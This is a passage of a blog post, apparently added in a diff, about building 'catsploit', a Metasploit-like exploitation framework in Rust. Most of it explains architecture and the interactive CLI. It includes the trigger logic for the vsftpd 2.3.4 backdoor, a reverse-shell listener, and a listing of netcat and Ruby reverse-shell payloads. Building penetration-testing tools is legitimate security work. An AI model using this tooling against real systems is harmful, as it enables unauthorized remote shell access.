+        &lt;span class=&quot;k&quot;&gt;let&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;mut&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;stream&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;self&lt;/span&gt;&lt;span class=&quot;py&quot;&gt;.remote_tcp&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;.connect&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;?&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+        &lt;span class=&quot;k&quot;&gt;let&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;mut&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;stream_buf&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;BufReader&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;::&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;new&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;stream&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;.try_clone&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;?&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+
+        &lt;span class=&quot;k&quot;&gt;let&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;mut&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;banner_resp&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;String&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;::&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;new&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;();&lt;/span&gt;
+        &lt;span class=&quot;n&quot;&gt;stream_buf&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;.read_line&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;mut&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;banner_resp&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;?&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+        &lt;span class=&quot;nd&quot;&gt;info!&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;Banner returned from server: {}&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;banner_resp&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+
+        &lt;span class=&quot;k&quot;&gt;let&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;user_hash&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;random_alphanumeric&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;6&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+        &lt;span class=&quot;n&quot;&gt;stream&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;.write_all&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nd&quot;&gt;format!&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;USER {}:)&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\r\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;user_hash&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;.as_bytes&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;())&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;?&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+        &lt;span class=&quot;k&quot;&gt;let&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;mut&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;user_hash_resp&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;String&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;::&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;new&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;();&lt;/span&gt;
+        &lt;span class=&quot;n&quot;&gt;stream_buf&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;.read_line&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;mut&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;user_hash_resp&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;?&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+        &lt;span class=&quot;nd&quot;&gt;info!&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;Response to user hash: {}&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;user_hash_resp&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+
+        &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;user_hash_resp&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;.contains&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;530&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
+            &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;Err&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;
+                &lt;span class=&quot;s&quot;&gt;&quot;Server is configured for anonymous only and the backdoor code cannot be reached&quot;&lt;/span&gt;
+                    &lt;span class=&quot;nf&quot;&gt;.into&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(),&lt;/span&gt;
+            &lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+        &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
+
+        &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;!&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;user_hash_resp&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;.contains&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;331&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
+            &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;Err&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;
+                &lt;span class=&quot;s&quot;&gt;&quot;Server is not responding as expected, response should contain 331 code&quot;&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;.into&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(),&lt;/span&gt;
+            &lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+        &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
+  &lt;span class=&quot;o&quot;&gt;...&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;With this we have a solid system for defining shared types(like &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;RemoteTcp&lt;/code&gt;) and shared traits(like &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Exploit&lt;/code&gt;) that modules can easily implement. The &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;vsftpd_234_backdoor.rs&lt;/code&gt; code only contains code directly relevant to the exploit itself and its options. This allows new contributors to open up a PR for a new exploit by slotting in a single file with the exploit code. Of course they will need to hook it all up into the Trait’s methods but that is generally simple enough.&lt;/p&gt;
+
+&lt;h4 id=&quot;aggregating-modules&quot;&gt;Aggregating modules&lt;/h4&gt;
+&lt;p&gt;So now that we have the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Vsftpd234Backdoor&lt;/code&gt; defined, we need some way for applications that use the library to be able to find all the available exploits and use them. This is accomplished with a simple &lt;a href=&quot;https://github.com/mark-ruddy/catsploit/blob/main/catsploit_lib/src/module/index.rs&quot;&gt;index.rs&lt;/a&gt; that has functions which return a &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Vec&amp;lt;Box&amp;lt;dyn Trait&amp;gt;&amp;gt;&lt;/code&gt;:&lt;/p&gt;
+
+&lt;div class=&quot;language-rust highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;k&quot;&gt;pub&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;fn&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;exploits&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;-&amp;gt;&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;Vec&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;Box&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;dyn&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;Exploit&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
+    &lt;span class=&quot;nd&quot;&gt;vec!&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;nn&quot;&gt;Box&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;::&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;new&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nn&quot;&gt;Vsftpd234Backdoor&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;::&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;default&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;())]&lt;/span&gt;
+&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
+
+&lt;span class=&quot;k&quot;&gt;pub&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;fn&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;payloads&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;-&amp;gt;&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;Vec&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;Box&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;dyn&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;Payload&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;Send&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;Sync&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
+    &lt;span class=&quot;nd&quot;&gt;vec!&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;
+        &lt;span class=&quot;nn&quot;&gt;Box&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;::&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;new&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nn&quot;&gt;RubyReverseTcp&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;::&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;default&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()),&lt;/span&gt;
+        &lt;span class=&quot;nn&quot;&gt;Box&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;::&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;new&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nn&quot;&gt;NcMkfifoReverseTcp&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;::&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;default&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()),&lt;/span&gt;
+    &lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;
+&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
+
+&lt;span class=&quot;k&quot;&gt;pub&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;fn&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;auxiliary&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;-&amp;gt;&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;Vec&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;Box&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;dyn&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;Auxiliary&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;Send&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;Sync&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
+    &lt;span class=&quot;nd&quot;&gt;vec!&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;nn&quot;&gt;Box&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;::&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;new&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nn&quot;&gt;MyIp&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;::&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;default&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;())]&lt;/span&gt;
+&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;An application can now call these indexing functions and can then do work with the vectors.&lt;/p&gt;
+
+&lt;h4 id=&quot;using-modules-concurrently&quot;&gt;Using modules concurrently&lt;/h4&gt;
+
+&lt;p&gt;Note how Payload and Auxiliary have the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;+ Send + Sync&lt;/code&gt; traits specified when stored in the vector, this is due to them commonly requiring to be called inside threads like such:&lt;/p&gt;
+
+&lt;div class=&quot;language-rust highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;payload&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;.needs_pretask&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
+    &lt;span class=&quot;n&quot;&gt;handle&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;Some&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nn&quot;&gt;thread&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;::&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;spawn&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;move&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;||&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;-&amp;gt;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;Result&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(),&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;String&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
+        &lt;span class=&quot;n&quot;&gt;payload&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;.pretask&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;.map_err&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(|&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;e&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;|&lt;/span&gt; &lt;span class=&quot;nd&quot;&gt;format!&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;{}&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;e&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt;
+    &lt;span class=&quot;p&quot;&gt;}));&lt;/span&gt;
+&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;An example of a pretask, opening up a listener for a reverse shell connection:&lt;/p&gt;
+
+&lt;div class=&quot;language-rust highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;k&quot;&gt;fn&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;pretask&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;self&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;-&amp;gt;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;Result&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(),&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;Box&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;dyn&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;std&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;::&lt;/span&gt;&lt;span class=&quot;nn&quot;&gt;error&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;::&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Error&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
+    &lt;span class=&quot;k&quot;&gt;let&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;mut&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;handler&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;GenericTcpHandler&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;::&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;new&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;0.0.0.0&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;self&lt;/span&gt;&lt;span class=&quot;py&quot;&gt;.reverse.lport&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;?&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+    &lt;span class=&quot;n&quot;&gt;handler&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;.listen_for_one&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;false&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;?&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+    &lt;span class=&quot;nf&quot;&gt;Ok&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(())&lt;/span&gt;
+&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Another thread is required when using this payload so that the reverse shell listener pretask does not block the rest of the exploit code from running.&lt;/p&gt;
+
+&lt;h3 id=&quot;the-cli-application&quot;&gt;The CLI application&lt;/h3&gt;
+&lt;p&gt;The CLI application hooks into the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;catsploit_lib&lt;/code&gt; library and uses it to provide an interactive CLI program. Metasploit have a similar approach to this(but more advanced, framework can connect to databases etc.), where the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;msfconsole&lt;/code&gt; is separate from the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;metasploit-framework&lt;/code&gt;.&lt;/p&gt;
+
+&lt;p&gt;It provides a simple, interactive loop for the user to interact with:&lt;/p&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;[~]$ catsploit
+
+ ________  ________  _________  ________  ________  ___       ________  ___  _________   
+|\   ____\|\   __  \|\___   ___\\   ____\|\   __  \|\  \     |\   __  \|\  \|\___   ___\ 
+\ \  \___|\ \  \|\  \|___ \  \_\ \  \___|\ \  \|\  \ \  \    \ \  \|\  \ \  \|___ \  \_| 
+ \ \  \    \ \   __  \   \ \  \ \ \_____  \ \   ____\ \  \    \ \  \\\  \ \  \   \ \  \  
+  \ \  \____\ \  \ \  \   \ \  \ \|____|\  \ \  \___|\ \  \____\ \  \\\  \ \  \   \ \  \ 
+   \ \_______\ \__\ \__\   \ \__\  ____\_\  \ \__\    \ \_______\ \_______\ \__\   \ \__\
+    \|_______|\|__|\|__|    \|__| |\_________\|__|     \|_______|\|_______|\|__|    \|__|
+                                  \|_________|                                           
+            
+---------------------
+ Module Type  Loaded 
+---------------------
+ Exploits     1 
+---------------------
+ Payloads     2 
+---------------------
+catsploit&amp;gt; show payloads
++---+-------------------------------------------+---------------------------+--------------+
+| # | Module Path                               | Name                      | Kind         |
++---+-------------------------------------------+---------------------------+--------------+
+| 0 | payload/ruby/reverse_tcp                  | Ruby Reverse TCP          | ReverseShell |
++---+-------------------------------------------+---------------------------+--------------+
+| 1 | payload/linux_shell/nc_mkfifo_reverse_tcp | Netcat Mkfifo Reverse TCP | ReverseShell |
++---+-------------------------------------------+---------------------------+--------------+
+catsploit&amp;gt; use 0
+catsploit (payload/ruby/reverse_tcp)&amp;gt; info   
++------------------+--------------------------+--------------+
+| Name             | Module Path              | Kind         |
++------------------+--------------------------+--------------+
+| Ruby Reverse TCP | payload/ruby/reverse_tcp | ReverseShell |
++------------------+--------------------------+--------------+
++-------+---------------+---------+---------+
+| Name  | Description   | Default | Current |
++-------+---------------+---------+---------+
+| LHOST | Listener host | 0.0.0.0 | 0.0.0.0 |
++-------+---------------+---------+---------+
+| LPORT | Listener port | 9092    | 9092    |
++-------+---------------+---------+---------+
+catsploit (payload/ruby/reverse_tcp)&amp;gt; set LHOST 192.168.1.1
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;h3 id=&quot;interactive-cli&quot;&gt;Interactive CLI&lt;/h3&gt;
+&lt;p&gt;An interactive CLI is relatively simple to implement. The complexity comes from holding state(e.g. Which exploit has the user currently selected? What options have they set to what values?).&lt;/p&gt;
+
+&lt;p&gt;The below code in the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;main&lt;/code&gt; function of the CLI app is enough to provide the interactive CLI loop:&lt;/p&gt;
+
+&lt;div class=&quot;language-rust highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;k&quot;&gt;fn&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;main&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;-&amp;gt;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;Result&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(),&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;Box&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;dyn&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;Error&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
+    &lt;span class=&quot;nn&quot;&gt;env_logger&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;::&lt;/span&gt;&lt;span class=&quot;nn&quot;&gt;Builder&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;::&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;from_env&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nn&quot;&gt;env_logger&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;::&lt;/span&gt;&lt;span class=&quot;nn&quot;&gt;Env&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;::&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;default&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;.default_filter_or&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;info&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;.init&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;();&lt;/span&gt;
+
+    &lt;span class=&quot;k&quot;&gt;let&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;mut&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;cli&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;Cli&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;::&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;default&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;();&lt;/span&gt;
+    &lt;span class=&quot;n&quot;&gt;cli&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;.print_banner&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;();&lt;/span&gt;
+    &lt;span class=&quot;n&quot;&gt;cli&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;.print_module_stats&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;();&lt;/span&gt;
+    &lt;span class=&quot;k&quot;&gt;loop&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
+        &lt;span class=&quot;n&quot;&gt;cli&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;.print_prompt&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;();&lt;/span&gt;
